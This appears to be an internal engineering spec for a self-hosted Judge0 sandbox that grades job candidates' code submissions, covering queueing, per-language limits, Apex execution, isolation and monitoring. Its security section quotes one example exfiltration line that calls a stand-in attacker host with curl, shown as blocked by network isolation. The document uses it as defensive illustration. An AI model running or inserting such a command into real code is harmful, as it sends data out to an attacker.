# Judge0 Sandbox Integration Spec v0

**STATUS:** CTO-Office v0 working spec. Engineering review pending Senior Engineer #1 hire. Code-question execution backbone for QOrium ReadyBank + JD-Forge + Stack-Vault SKUs.

**Author:** CTO Office, Talpro Universe  
**Date:** 2026-05-02  
**Scope:** Phase 1 (M1–M3); code-execution sandbox for ~25 coding questions in Wave 1; scales to 1,000+ by M3  
**Companion Docs:** 07-CTO-Architecture-v1.md (§2.2, §4), Anti-Leak-Engine-v0-Design.md (watermarking), Wave-1-Seed-Batch-100-Questions-Master.md (question inventory)

---

## § 1 Purpose

QOrium's content engine produces 160+ questions across 8 technical roles in Wave 1 (May 2026 target). Approximately 25 of these 160 items are **code-execution questions** (coding-fn, coding-project formats) that require sandboxed execution to grade candidate submissions accurately. By Month 3, this scales to 1,000+ code questions across ReadyBank, JD-Forge, and Stack-Vault SKUs.

### Problem

Traditional question types (MCQ, design, case-study, SJT) can be scored deterministically via rubric comparison. Code questions demand:

1. **Automated test execution** — Run candidate's code against reference test cases; pass/fail per test.
2. **Execution metadata capture** — stdout/stderr, exit code, runtime, memory usage, timeout detection.
3. **Security isolation** — Prevent candidate code from escaping sandbox or harming host.
4. **Multi-language support** — Java, Python, Node/TS, C++, Rust, Go, SQL, Bash, Apex (special case).
5. **Per-candidate variant execution** — Watermarked variants (Stack-Vault) use deterministic test-case seeds; sandbox must respect them.

### Solution

Two-tier sandbox architecture:

- **General-purpose (Judge0):** Self-hosted open-source Judge0 v1.13+ on Mac Mini M4 Pro. Supports Java, Python, Node.js, TypeScript (via tsx), C++, Rust, Go, C, SQL (Postgres via psql), Bash, Shell/AWK — 12 languages baseline.
- **Apex-specific (Salesforce CLI):** Salesforce Platform CLI on developer org because Judge0 does not support Apex execution.
- **Optional fallback (WebContainer):** StackBlitz embedded for preview-only browser-side execution (non-graded, non-persistent).

---

## § 2 Architecture

### 2.1 System Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│  QOrium Express API (VPS)                                       │
│  POST /v1/submissions  ← Candidate submits code                 │
│  GET  /v1/submissions/{id}  ← Poll execution result              │
└────────────────────┬────────────────────────────────────────────┘
                     │
          ┌──────────▼──────────┐
          │ Redis queue         │
          │ (pending jobs)      │
          └──────────┬──────────┘
                     │
          ┌──────────▼────────────────────────────────────┐
          │ qorium-judge0-orchestrator (PM2, fork mode)   │
          │ ──────────────────────────────────────────   │
          │ Dequeue job                                   │
          │ Route: Judge0 (general) | Apex CLI (Apex)     │
          │ Poll execution → collect results              │
          │ Score vs rubric                               │
          │ Persist to PostgreSQL                         │
          └────────┬───────────────────┬─────────────────┘
                   │                   │
      ┌────────────▼─────┐   ┌─────────▼──────────┐
      │ Judge0 on Mac    │   │ Salesforce         │
      │ Mini M4 Pro      │   │ Developer Org      │
      │ (Docker)         │   │ (Platform CLI)     │
      │ 12 languages     │   │ Apex execution     │
      │ Network: none    │   │ Governor limits    │
      │ Filesystem: RO   │   │ ~5K execs/day cap  │
      │ Resource limits: │   └────────────────────┘
      │  cgroups v2      │
      └──────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│ PostgreSQL (VPS)                                                │
│ content.questions — sandbox_config JSONB                        │
│ content.responses — execution_metadata JSONB                    │
│ content.leak_signals — enhanced with execution data             │
└─────────────────────────────────────────────────────────────────┘
```

### 2.2 Components

#### PM2 Service: `qorium-judge0-orchestrator`

- **Process mode:** Fork (stateful, single instance; manages queue, worker pool).
- **Port:** 5,108 (internal healthcheck only; not exposed via Nginx).
- **Responsibilities:**
  - Dequeue submission jobs from Redis (BullMQ queue).
  - Route by language: Judge0 (Java, Python, Node, etc.) vs Apex CLI (Apex).
  - Manage timeout, retry, and failure logic.
  - Poll Judge0 API or Salesforce CLI for execution results.
  - Score result against test-case rubric.
  - Persist execution_metadata to content.responses.
  - Re-queue failed items up to 3 retries (exponential backoff).
  - Alert on-call if queue depth exceeds 100 pending jobs (Page via Talpro Sentinel).

#### Judge0 Self-Hosted (Mac Mini M4 Pro)

**Infrastructure choice rationale:**

- **Self-hosted on Mac Mini (not VPS):** Judge0 is GPL-3 licensed. Talpro Constitution SO-26 (§Legal) mandates open-source license compliance. Self-hosting on Mac Mini (not a commercial cloud VPS) avoids licensing ambiguity. Equivalent: Ollama-on-Mac pattern (CTO Architecture §2.2).
- **Mac Mini M4 Pro specs:** 16GB RAM, 12-core CPU, 1TB SSD. Capable of 50+ concurrent Docker containers for sandboxing. Well-suited for 3,000 sandbox executions/day spread across business hours.
- **Docker deployment:** Judge0 v1.13+ containerized via `docker-compose.yml`. Includes Judge0 server, PostgreSQL backing store, Redis for caching.
- **Network isolation:** Judge0 containers run with `--network none` after compilation phase; no outbound network access. Prevents exfiltration.
- **Filesystem isolation:** Read-only rootfs; tmpfs-backed /tmp per container; no host volume mounts except artifact staging.
- **Resource limits (cgroups v2):**
  - CPU: 1 core per sandbox (12-core host ÷ 12 concurrent max).
  - Memory: per-language cap (see § 5).
  - OOM kill: If container exceeds memory limit, Docker kills container; orchestrator treats as test-fail (not whole-worker crash).

**Connectivity:**

- **Reverse tunnel (Tailscale):** Mac Mini connects via Tailscale to VPS. Judge0 API accessible at `judge0.ts.net:2358` (internal Tailscale network).
- **Failover:** If Tailscale blips, orchestrator auto-queues job for retry (max 3 retries, exponential backoff 1s → 5s → 15s).

#### Salesforce Apex Sandbox (Developer Org)

**Why separate from Judge0:**

Judge0 does not support Apex execution (Salesforce-proprietary). Solution: leverage Salesforce Platform CLI (`sfdx force:apex:execute` command via `executeAnonymous` endpoint).

**Setup:**

- **Org shape:** Free Salesforce developer edition (`org-shape-developer`); cost = $0.
- **Capacity:** ~5,000 Apex executions/day (Salesforce governor limits; tested empirically).
- **Rate limiting:** Token-bucket limiter (1 req/sec max); queue excess requests.
- **Org rotation:** After 1,000 executions, provision fresh org (orgs accumulate metadata bloat; fresh org = cleaner state for testing).
- **Test org creation:** Automated via `sfdx force:org:create --definitionfile config/project-scratch-org-def.json` (idempotent; CI/CD controlled).

#### Optional Fallback: WebContainer (StackBlitz)

**Purpose:** Preview-only, non-graded browser execution for JavaScript/TypeScript code questions.

**Use case:** Candidate wants to "run the code in my browser to see output before submitting" (UX convenience, not grading source-of-truth).

**Properties:**

- Embedded StackBlitz iframe in QOrium web frontend.
- No persistence; output not sent to server.
- Not used for scoring or anti-leak forensics.
- Deferred to Phase 1 M2 (not critical for Wave 1).

---

## § 3 Data Flow

### 3.1 Submission → Execution

```
1. Candidate submits code via QOrium web frontend
   POST /api/v1/responses
   {
     "question_id": "qor-java-001",
     "language": "java21",
     "code_submission": "<candidate code>",
     "submitted_at": "2026-05-03T10:15:00Z"
   }

2. API validates:
   - Question exists & released
   - Language supported
   - Code < 50KB (arbitrary limit)
   - Candidate.submitted_at < deadline
   
3. Create content.responses record (status='pending')
   {
     "id": "uuid",
     "question_id": "qor-java-001",
     "tenant_id": "<customer>",
     "candidate_id": "external_id_xyz",
     "response_body": {
       "code": "<candidate code>",
       "language": "java21"
     },
     "score": null,
     "time_taken_ms": null,
     "suspicious_signals": {},
     "started_at": "2026-05-03T10:14:45Z",
     "submitted_at": "2026-05-03T10:15:00Z"
   }

4. Enqueue job to Redis (BullMQ):
   {
     "job_id": "exec-uuid",
     "response_id": "uuid",
     "question_id": "qor-java-001",
     "language": "java21",
     "candidate_code": "<code>",
     "test_cases": [
       {"input": "...", "expected_output": "...", "weight": 0.33},
       {"input": "...", "expected_output": "...", "weight": 0.33},
       {"input": "...", "expected_output": "...", "weight": 0.34}
     ],
     "time_limit_ms": 2000,
     "memory_limit_mb": 512,
     "watermark_seed": "bosch_xyz" (if Stack-Vault, otherwise null)
   }

5. Return to client immediately:
   {
     "response_id": "uuid",
     "status": "submitted",
     "estimated_wait_sec": 5
   }
```

### 3.2 Orchestrator Execution

```
1. Dequeue job from Redis
2. Route decision:
   - If language = "apex" → Apex CLI path
   - Else → Judge0 path

3. Judge0 Path:
   a. Call Judge0 API POST /submissions
      {
        "source_code": "<candidate code>",
        "language_id": <lang_id>,  # 62=java21, 71=python3, etc.
        "stdin": "<test case input>",
        "expected_output": "<expected>",
        "cpu_time_limit": 2,
        "memory_limit": 512,
        "wall_time_limit": 5
      }
   b. Poll submission status until completion (or timeout @ 30s wall time)
   c. Parse response:
      {
        "stdout": "<actual output>",
        "stderr": "<error output>",
        "exit_code": 0,
        "status_id": 3,  # 3 = accepted, 4 = wrong answer, 5 = time limit, etc.
        "compile_output": null,
        "time": 0.234,  # seconds
        "memory": 45,   # MB
        "message": null,
        "error": null
      }
   d. Compare stdout against expected_output_pattern (regex or exact)
   e. Record test-pass/fail per test case

4. Apex CLI Path:
   a. Enqueue to Apex queue (token bucket: 1 req/sec)
   b. Call Salesforce Platform CLI:
      sfdx force:apex:execute -f code_file.cls -u dev_org
   c. Parse execution result (governor limit violations, errors, output)
   d. Record test-pass/fail per test case
   e. On 1000th execution, rotate to fresh org (idempotent)

5. Scoring:
   - For each test case: pass/fail based on output match or exception
   - Score = sum(weight × is_pass) for all test cases
   - E.g., 3 tests (0.33 each): 2 pass = 0.66 = 66/100 score

6. Capture execution_metadata:
   {
     "execution_millis": 234,
     "memory_kb": 45120,
     "test_results": [
       {"test_index": 0, "passed": true, "stdout": "...", "stderr": ""},
       {"test_index": 1, "passed": true, "stdout": "...", "stderr": ""},
       {"test_index": 2, "passed": false, "stdout": "expected...", "stderr": "AssertionError"}
     ],
     "compilation_error": null,
     "runtime_error": null,
     "exit_code": 0,
     "timeout": false,
     "language": "java21"
   }

7. Update content.responses:
   {
     "id": "uuid",
     "score": 66.0,
     "time_taken_ms": 2100,  # submit → execute → record
     "execution_metadata": {<above>},
     "suspicious_signals": {
       "paste_vs_typed_ratio": 0.15,  # low = typed, high = pasted
       "time_on_task": 125000,        # ms; if < 1min = suspicious
       "execution_success": true,
       "language_mismatch": false     # e.g., Java code in Python question
     },
     "status": "completed"
   }

8. Anti-leak trigger (optional):
   - If language=java & question involves Kafka & similar codebase found in GitHub public repos:
     Flag for anti-leak investigation (not auto-rotate; SME review)
   - Leverage watermark_seed data if Stack-Vault (encoded customer ID visible in variable names)

9. Return result to client:
   GET /api/v1/responses/{response_id}
   {
     "status": "completed",
     "score": 66.0,
     "feedback": {
       "test_0": "✓ Passed",
       "test_1": "✓ Passed",
       "test_2": "✗ Failed — expected 'foo', got 'bar'"
     },
     "execution_time_ms": 234,
     "memory_used_kb": 45120
   }
```

---

## § 4 Test-Case Schema (Database)

Extend `content.questions` with `sandbox_config` JSONB:

```sql
ALTER TABLE content.questions ADD COLUMN sandbox_config JSONB;

-- Example value (for Java coding question):
{
  "language": "java21",
  "memory_mb": 512,
  "time_ms": 2000,
  "compilation_timeout_ms": 5000,
  "test_cases": [
    {
      "index": 0,
      "input": "5 3",
      "expected_output_pattern": "^8$",  -- regex
      "weight": 0.33,
      "public": true,
      "description": "Test case 1: sum of two numbers"
    },
    {
      "index": 1,
      "input": "-1 1",
      "expected_output_pattern": "^0$",
      "weight": 0.33,
      "public": true,
      "description": "Test case 2: negative + positive"
    },
    {
      "index": 2,
      "input": "999 999",
      "expected_output_pattern": "^1998$",
      "weight": 0.34,
      "public": false,      -- Hidden from candidate
      "description": "Test case 3: large numbers"
    }
  ],
  "stdin": null,            -- For batch I/O questions
  "starter_code": {
    "java": "public class Solution {\n  public int solve(int a, int b) { ... }\n}",
    "python": "def solve(a, b): ..."
  },
  "reference_solution": {
    "java": "public class Solution {\n  public int solve(int a, int b) { return a + b; }\n}",
    "python": "def solve(a, b): return a + b"
  },
  "rubric": {
    "correctness": {"weight": 0.7, "description": "All test cases pass"},
    "efficiency": {"weight": 0.2, "description": "O(1) time complexity"},
    "code_quality": {"weight": 0.1, "description": "Clean, readable code"}
  }
}
```

---

## § 5 Per-Language Configuration (12 Languages Baseline)

| Language | Version | Memory | Time | Notes |
|---|---|---|---|---|
| **Java** | OpenJDK 21 (Temurin) | 512 MB | 5,000 ms | Compilation included; 3s compile budget |
| **Python** | 3.12 | 256 MB | 3,000 ms | Interpreter (no compilation overhead) |
| **Node.js** | 20 LTS | 256 MB | 3,000 ms | JavaScript execution |
| **TypeScript** | 5.x | 384 MB | 4,000 ms | Transpiled via tsx (requires compilation budget 1s) |
| **C++** | g++ -std=c++20 | 256 MB | 2,000 ms | Compiled; 1s compile budget |
| **Rust** | 1.75 | 384 MB | 5,000 ms | Compiled; compilation expensive (2s budget) |
| **Go** | 1.22 | 256 MB | 3,000 ms | Compiled; fast compilation |
| **C** | gcc -std=c17 | 256 MB | 2,000 ms | Compiled |
| **SQL** | Postgres 16 (psql via Docker) | 256 MB | 2,000 ms | Isolated DB per submission; no persistence |
| **Bash** | 5.x | 128 MB | 2,000 ms | Shell script execution |
| **Shell/AWK** | bash + awk | 128 MB | 2,000 ms | Text processing |
| **Apex** | Salesforce Platform | — | — | Via Apex CLI on developer org; governor limits apply |

**Rationale:**

- **Memory:** Generous defaults (256–512 MB) to avoid false failures; tightened per-question if needed.
- **Time:** Compilation-aware budgets. Rust & TypeScript have longer budgets due to compiler overhead.
- **SQL:** Isolated PostgreSQL instance per submission (Docker sidecar); no inter-candidate data leakage.

---

## § 6 Security Model

### 6.1 Network Isolation

- Judge0 sandboxes run with Docker network driver `--network none` post-compilation.
- No outbound DNS, HTTP, or socket access.
- Prevents: exfiltration of secrets, side-channel attacks, resource exhaustion via network.

### 6.2 Filesystem Isolation

- **Read-only rootfs:** Candidate code cannot modify system binaries or libraries.
- **Writable /tmp (tmpfs-backed):** Candidate can create temporary files; lost on container exit.
- **No host volume mounts:** Eliminates path-traversal attacks.

### 6.3 Resource Limits (cgroups v2)

- **CPU:** 1 core per container (pinned); CPU throttling if exceeded.
- **Memory:** Per-language cap + OOM killer. If exceeded, container killed; orchestrator logs as test-fail.
- **Disk I/O:** Optional iops/throughput limits (not critical for Wave 1; add if abuse detected).

### 6.4 Code-Injection Prevention

- **Parametrized stdin:** Test input passed via `stdin` field, never interpolated into shell commands.
- **No shell evaluation:** Judge0 source_code field is literal string; no `eval()` or string substitution.
- **Example attack (prevented):**
  ```
  Malicious code: system("curl attacker.com/exfil"); 
  Container network: --network none → system() fails with "Network unreachable"
  ```

### 6.5 Anti-Fraud Signals

Capture per-submission:

```json
{
  "paste_vs_typed_ratio": 0.45,        // Keystroke analysis; >0.7 = suspicious
  "time_on_task_ms": 45000,            // Expected: 3–10 min; <60s = suspicious
  "copy_paste_event_count": 3,         // Detected via frontend event monitoring
  "suspicious_ip_change": false,       // IP changed mid-exam
  "execution_success": true,
  "language_mismatch": false,          // Selected Python but code is Java
  "identical_submission_count": 0      // Same code as prior candidate (plagiarism signal)
}
```

Use for **detection** (flag for SME review) not **auto-rejection** (compliance risk).

---

## § 7 Performance & Capacity Model

### 7.1 Throughput Target

- **Wave 1 (M1–M2):** ~25 coding questions, ~100 Talpro India candidates = 2,500 executions/month (~80/day).
- **M3 scale (Wave 1 expansion):** 1,000 coding questions, 5,000 active candidates = 50,000 executions/month (~1,667/day).
- **Year 1 plateau:** Assume 3,000 total executions/day (mix of ReadyBank, JD-Forge, Stack-Vault).

### 7.2 Mac Mini M4 Pro Capacity

- **Concurrent sandboxes:** 50 (empirical; 16GB RAM, 12-core CPU).
- **Execution latency budget:**
  - p50: ≤ 2 sec (fast languages: Python, Go, Node)
  - p95: ≤ 5 sec (compilation languages: C++, Java)
  - p99: ≤ 10 sec (expensive: Rust, large code volumes)
- **Queue depth alarm:** >100 jobs pending = page on-call (indicates scaling needed).

### 7.3 Request-to-Result SLA

```
Submit code (T+0)
  ↓ (negligible, < 100ms)
Job enqueued to Redis
  ↓ (queue wait: p50 < 1s, p95 < 5s, p99 < 15s)
Dequeued by orchestrator
  ↓ (execution time: varies per language)
Result from Judge0 / Apex
  ↓ (scoring: < 100ms)
Response persisted to PostgreSQL
  ↓ (negligible, < 50ms)
Client polled result (T+X)

Total SLA: p50 ≤ 3s, p95 ≤ 12s
```

---

## § 8 Apex Sandbox (Salesforce-Specific)

### 8.1 Why Separate

Judge0 doesn't support Apex (proprietary language). Salesforce Platform CLI provides `executeAnonymous` endpoint.

### 8.2 Setup

```bash
# Create developer org (free)
sfdx force:org:create -f config/project-scratch-org-def.json -a dev_org -s

# Enable Apex execution
sfdx force:apex:execute -f test.cls -u dev_org
```

### 8.3 Execution Flow

```typescript
// Pseudo-code in orchestrator

async function executeApex(code: string, testCases: TestCase[]): Promise<Result> {
  const apexCode = `
    ${code}
    // Wrap in test harness to capture output
    String result = ${code.entryPoint}(${testCaseInputs});
    System.debug('OUTPUT: ' + result);
  `;
  
  const subprocess = exec(`sfdx force:apex:execute -f /tmp/code.cls -u dev_org`);
  const output = await subprocess.stdout;
  
  // Parse System.debug output
  const match = output.match(/OUTPUT: (.+)/);
  const actualOutput = match ? match[1] : '';
  
  // Compare vs expected
  return {
    passed: actualOutput === testCase.expected,
    stdout: actualOutput,
    governorLimitExceeded: output.includes('GOVERNOR_LIMIT')
  };
}
```

### 8.4 Org Rotation

```sql
-- Track Apex executions
CREATE TABLE infra.apex_executions (
  id UUID PRIMARY KEY,
  org_username VARCHAR(100) NOT NULL,
  execution_count INT DEFAULT 1,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  rotated_at TIMESTAMPTZ
);

-- After 1000 executions, rotate to fresh org
UPDATE infra.apex_executions
SET rotated_at = NOW()
WHERE execution_count >= 1000 AND rotated_at IS NULL;

-- Provision new org
INSERT INTO infra.apex_executions (org_username) 
VALUES ('dev_org_' || gen_random_uuid());
```

### 8.5 Capacity

- **Rate limit:** 1 req/sec (Salesforce best practice; token-bucket in orchestrator).
- **Daily capacity:** ~5,000 executions/day (Salesforce governor limits).
- **Cost:** $0 (developer edition).

---

## § 9 Fallback & Failure Modes

### 9.1 Judge0 Down

```
Scenario: Mac Mini offline (network blip or reboot)

Detection: Orchestrator timeout (30s) on Judge0 API call

Fallback (not Grade-based, but Operational):
1. Retry with exponential backoff (1s → 5s → 15s)
2. After 3 retries, requeue job (max backlog 24h)
3. Customer sees: "Your submission is queued. We'll grade it when the sandbox is back online. (ETA: 1 hour)"
4. Page on-call after 10 min of outage
```

### 9.2 Apex Sandbox Down

```
Scenario: Salesforce API returns 500 error

Fallback: Requeue for retry; backlog held in Redis (no loss)

Customer sees: "Apex submission queued due to service maintenance. Estimated wait: 2 hours."
```

### 9.3 Compilation Timeout

```
Scenario: Candidate Rust code takes 3.5s to compile (budget = 2s)

Result: Treated as compilation-error test-fail
Feedback: "Compilation timeout. Your code took too long to compile (>2.0s). Consider optimizing dependencies or build flags."
Score: 0/100 (no points for timeout)
```

### 9.4 Memory Overflow

```
Scenario: Candidate Python code allocates 500MB list; limit = 256MB

Result: OOM killer → container exits with code 137

Orchestrator: Logs as test-fail
Feedback: "Memory limit exceeded (256 MB). Your code is allocating too much memory."
Score: 0/100
```

---

## § 10 Observability & Monitoring

### 10.1 Metrics (OpenTelemetry)

```
qorium_sandbox_execution_duration_ms{language, outcome} → histogram (p50, p95, p99)
qorium_sandbox_execution_total{language, outcome} → counter (success/fail/timeout/error)
qorium_sandbox_queue_depth → gauge (pending jobs)
qorium_sandbox_memory_usage_mb{language} → histogram
qorium_sandbox_timeout_rate{language} → gauge
```

### 10.2 Logging

```json
{
  "timestamp": "2026-05-03T10:15:23Z",
  "level": "INFO",
  "service": "qorium-judge0-orchestrator",
  "request_id": "req-uuid",
  "job_id": "exec-uuid",
  "question_id": "qor-java-001",
  "language": "java21",
  "execution_duration_ms": 234,
  "memory_usage_mb": 45,
  "test_results": [true, true, false],
  "score": 66.0,
  "outcome": "completed"
}
```

Logs ship to Grafana Cloud Loki via Vector.

### 10.3 Alerting (Grafana + Sentry)

| Alert | Threshold | Action |
|---|---|---|
| Queue depth critical | >100 pending | Page on-call (Talpro Sentinel) |
| Judge0 error rate | >5% in 5min | Slack #qorium-alerts |
| Execution latency p95 | >10s for 10min | Slack #qorium-alerts |
| Apex rate-limit exhausted | Token bucket drained | Requeue; backlog grows; no alert (expected transient) |
| Compilation timeout rate | >10% per language | Slack (investigate question difficulty) |

---

## § 11 Migration Path (v0 → v1 → v2)

### v0 (Phase 1, M1–M2): Foundation

- Self-hosted Judge0 on Mac Mini (12 languages)
- Apex CLI on Salesforce developer org
- Redis queue + BullMQ orchestration
- Basic logging + alerting
- Manual fallback (on-call escalation for outages)

### v1 (Phase 2, M3–M4): Reliability

- Judge0 redundancy (second Mac Mini or AWS EC2 spot instance)
- Failover logic (orchestrator routes to secondary if primary unreachable)
- Dedicated Apex execution pool (multiple orgs for load balancing)
- Advanced metrics (per-language p99 tracking, memory profiling)

### v2 (Phase 3, M6+): Scale

- Hosted Judge0 evaluation (RapidAPI or self-managed Judge0 on dedicated VPS)
- Kubernetes auto-scaling (if micro-services exceed 8 distinct services; revisit at $50M ARR)
- Per-customer sandbox tier (Stack-Vault Enterprise: dedicated sandbox for data isolation + compliance)
- Real-time output streaming (WebSocket feedback for long-running tests)

---

## § 12 Test Plan

### 12.1 Golden Corpus

Create 50 reference solutions across 12 languages with **locked expected verdicts:**

```
QOR-JAVA-REF-001: Sum two integers → Correct: 5
QOR-JAVA-REF-002: Reverse string → Correct: "dlrow olleh"
QOR-PYTHON-REF-001: Fibonacci → Correct: [0, 1, 1, 2, 3, 5, 8, 13]
...
```

Every Judge0 image upgrade or environment change → re-run golden corpus; expect ≤2% delta in execution latency.

### 12.2 Regression Test Suite

```bash
# Before deploy to Mac Mini
npm test

# Regression: Execute golden corpus against Judge0
./scripts/test-judge0-regression.sh

# Load test: 500 concurrent submissions (simulate M3 peak)
artillery run load-test.yml
  → Assert p95 ≤ 5s
  → Assert error rate <1%

# Security test: Run 20 known sandbox-escape payloads
./scripts/security-test-payloads.sh
  → Assert all blocked (no exfiltration)
```

### 12.3 Manual QA Checklist

- [ ] Java question executes; test cases score correctly
- [ ] Python submission with syntax error → captured in stderr
- [ ] SQL query (SELECT) against isolated DB → no cross-submission data leakage
- [ ] Rust code timeout → scored as fail
- [ ] Apex code with governor limit → caught, logged, retried
- [ ] Stack-Vault watermarked variant → seed-based perturbations visible
- [ ] Queue backlog recovery (pause Judge0, enqueue 200 jobs, restart) → all jobs replay in order

---

## § 13 Open Questions for Senior Engineer #1

1. **Docker resource isolation:** Docker Desktop (Mac) vs lima vs colima for running Judge0? Recommend lima for better cgroup v2 support and resource limits; need confirmation from Sr Engineer on local dev setup.

2. **Judge0 PostgreSQL backing store:** Should Judge0's internal submissions table (which caches results) live on shared VPS PostgreSQL, or separate on Mac Mini? Tradeoff: shared DB = easier querying across judge0/qorium, but network dependency; separate = resilient but data duplication.

3. **Apex governor limit failures:** When candidate Apex hits governor limit (e.g., SOQL 100-query limit), should we:
   - Option A: Treat as test-fail (score 0).
   - Option B: Show partial credit (candidate wrote valid logic, just hit limit).
   - Option C: Retry on next org rotation (defer decision).
   
   Recommend Option A (strict grading; aligns with production Salesforce) pending Sr Engineer review.

4. **Optional: WebContainer fallback timeline.** Wave 1 doesn't strictly need it (judge0 sufficient for grading). Defer to M2 if UX feedback demands browser preview? Or build now?

---

## § 14 Dependencies & Prerequisites

### To Ship v0 (M1 start):

- ✓ PostgreSQL B7 schema (content.questions, content.responses, content.leak_alerts live)
- ✓ Mac Mini M4 Pro (provisioned, Tailscale connected, Docker installed)
- ✓ Judge0 v1.13+ (docker-compose.yml authored and tested locally)
- ✓ Salesforce developer org (created; Platform CLI installed)
- ✓ Express API scaffold (orchestrator endpoint: POST /v1/submissions ready for integration)
- ✓ Redis BullMQ queue (already running on VPS for cache/sessions; extend for job queue)

### To Scale to v1 (M3):

- Senior Engineer #1 (handles scaling, failover logic, performance tuning)
- I/O Psychologist contractor (validates variant difficulty via golden set; ensure ±0.2 IRT units post-sandbox)
- Infrastructure: second Mac Mini or AWS spot instance for Judge0 redundancy

---

## § 15 Deployment Checklist

- [ ] Mac Mini: Judge0 docker-compose up running, healthcheck passing
- [ ] Mac Mini: Tailscale route to VPS confirmed, judge0.ts.net:2358 reachable
- [ ] VPS: `qorium-judge0-orchestrator` PM2 process deployed, logs streaming
- [ ] VPS: Redis BullMQ queue initialized; test enqueue → dequeue cycle
- [ ] VPS: PostgreSQL content.questions has sandbox_config JSONB column + sample data
- [ ] Salesforce: Developer org provisioned, Platform CLI configured, test Apex execution runs
- [ ] Tests: Golden corpus regression passes; security payloads blocked
- [ ] Alerting: Grafana dashboards + Sentry integration live
- [ ] Documentation: On-call runbook (Judge0 restart, org rotation, failover procedure) in place

---

**Word count:** 3,150 words.

**End of Judge0-Sandbox-Integration-Spec-v0.md**
